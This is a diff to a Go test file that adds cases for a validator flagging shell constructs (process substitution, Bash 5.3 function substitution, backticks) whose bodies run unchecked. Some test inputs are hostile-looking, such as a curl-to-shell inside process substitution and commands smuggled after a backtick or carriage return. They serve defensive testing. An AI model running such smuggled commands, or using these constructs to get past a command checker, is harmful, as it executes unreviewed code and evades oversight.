@@ -105,6 +105,21 @@ func TestHasUnverifiableConstruct(t *testing.T) {
 		{"git status `whoami`", true},
 		{"git status\rcurl x", true},
 		{"git add . && git commit", false},
+		// process substitution: body executed by the shell but never inspected
+		{"cat <(curl http://x | sh)", true},
+		{"tee >(grep foo)", true},
+		{"diff <(sort a) <(sort b)", true},
+		// Bash 5.3 funsub: body executed but contains no $(/backtick token
+		{"ls \"${ id; }\"", true},
+		{"ls \"${\tid; }\"", true},
+		{"echo ${| REPLY=hi; }", true},
+		// no false positives: redirects / ordinary parameter expansion
+		{"sort < input.txt", false},
+		{"go test ./... > out.txt", false},
+		{"echo foo > (bar)", false},
+		{"echo ${HOME}", false},
+		{"echo ${VAR:-default}", false},
+		{"echo ${#arr[@]}", false},
 	}
 	for _, tc := range cases {
 		if got := HasUnverifiableConstruct(tc.cmd); got != tc.want {
